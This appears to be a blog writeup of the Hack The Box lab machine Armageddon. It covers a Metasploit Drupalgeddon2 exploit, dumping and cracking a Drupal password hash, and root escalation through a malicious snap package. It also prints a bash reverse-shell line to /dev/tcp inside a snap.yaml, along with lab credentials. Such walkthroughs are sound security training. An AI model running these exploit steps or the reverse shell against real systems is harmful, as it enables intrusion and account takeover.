---
title: "HTB: Armageddon Writeup"
date: 2021-06-08T22:23:00-07:00
categories:
  - blog
  - writeup
  - htb
tags:
  - htb
  - htb easy
  - offsec
---

There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!

---

# Enumeration

## nmap

As always, beginning with an `nmap` of the box to determine what is open

```bash
$ cat nmap/armageddon.nmap
# Nmap 7.91 scan initiated Tue Jun  8 18:06:58 2021 as: nmap -sC -sV -oA nmap/armageddon 10.10.10.233
Nmap scan report for 10.10.10.233
Host is up (0.078s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  8 18:07:10 2021 -- 1 IP address (1 host up) scanned in 12.08 seconds
```

With only two ports open, looks like we'll be doing something with the web server.

## Web Server

Browsing to the webpage, it appears to be running Druple 7, after a bit of exploring and googling about the version, there appears to be something referred to as "Drupalgeddon", which I will explore next.

# Foothold

## Apache User

Looking into the "Drupalgeddon" vulnerability, Metasploit already has a package for it, since the server appears to be vulnerable, we can give it a try.

```bash
$ msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set lhost 10.10.14.204; set rhost 10.10.10.233; run"
```

Which worked, first try! Granting us a shell as `apache`.

## brucetherealadmin User

Once in the Apache user, we can take a look at the `settings.php` file to locate the database username/password:

```bash
$ cat /var/www/html/sites/default/settings.php
...{snip}...
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
...{snip}...
```

Looks like we now have a database login, trying that password for both `root` and `brucetherealadmin` results are unsuccessful, so neither of the users are reusing this password.

Moving on, we can try logging into the MySQL database, but given that we do not have an interactive session, we can't directly connect to MySQL and execute commands. However, we can execute a single query at a time from the CLI.

```bash
$ mysql -u drupaluser -p drupal -e "select * from users;"
password: CQHEy@9M*m23gBVj
...{snip}...
brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu
...{snip}...
```

Alright, looks like `brucetherealadmin` created an account on the Druple site, and this account has a password. I wonder if Bruce decided to reuse the password? Well, lets try and crack it first. JTR understands the Druple format, so we can throw this hash into JTR and see what comes up.

```bash
$ echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' > pass.txt
$ john --wordlist /usr/share/wordlists/rockyou.txt --format=Drupal7 pass.txt
```

Almost instantly, JTR returns with the found password for Bruce. Giving that a try with SSH, Success!

# Privesc

Once logged in as `brucetherealadmin`, the first thing to notice is that Bruce has access to install snap plugins as root:

```bash
$ sudo -l
...{snip}...
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

What can we do with this?

After researching snap plugins, it looks like there's a "dirty_sock" exploit that may be able to be used to install a snap file and have it create a new user that has access to use sudo. Specifically the [dirty_sockv2.py](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py) which contains a snap payload already.

Grabbing the snap payload from the `dirty_sockv2.py` script and placing it into a text file and decoding it as such:

```bash
$ vim dirty.snap.b64
$ base64 -d dirty.snap.b64 > dirty.snap
```

Then, we can install this snap

```bash
$ sudo snap install dirty.snap --devmode
dirty-sock 0.1 installed
```

Well, that appears to have worked, lets give it a try...

```bash
$ su dirty_sock
Password: dirty_sock
[dirty_sock@armageddon brucetherealadmin]$ whoami
dirty_sock
```

Looks promising! Lets try and change to root

```bash
$ sudo su
[sudo] password for dirty_sock: dirty_sock
[root@armageddon brucetherealadmin]#
```

Great! We're now root!

# Note/observation

During the process of rooting this, I first looked into crafting my own snap plugin, and I was able to craft one by creating a `snap.yaml` file as such:

```bash
$ cat pingme/meta/snap.yaml
name: pingme
version: '0.1'
app:
    pingme:
        command: /usr/bin/ping -c 1 10.10.14.204
```

And building a snap installer with:

```bash
$ snapcraft pack pingme
...
$ sudo snap install pingme.snap --devmode
```

Which, once I installed the plugin I did successfully receive pings back to me

```bash
$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
00:45:51.901719 IP 10.10.14.1 > 10.10.14.204: ICMP host 10.10.10.233 unreachable, length 204
00:45:56.411439 IP 10.10.14.1 > 10.10.14.204: ICMP host 10.10.10.233 unreachable, length 204
```

However, when I moved on to attempting to set up a reverse shell:

```bash
$ cat rshell/meta/snap.yaml
name: rshell
version: '0.1'
app:
    rshell:
        command: /bin/bash -i >& /dev/tcp/10.10.14.204/9000 0>&1
$ snapcraft pack rshell
...
$ sudo snap install rshell.snap --devmode
```

I never received a reverse shell back to myself, so I'm not certain if I crafted the snap package correctly, but I suspect that there's a way to craft your own snap payload without using the pre-build one from the repository that I used previously.
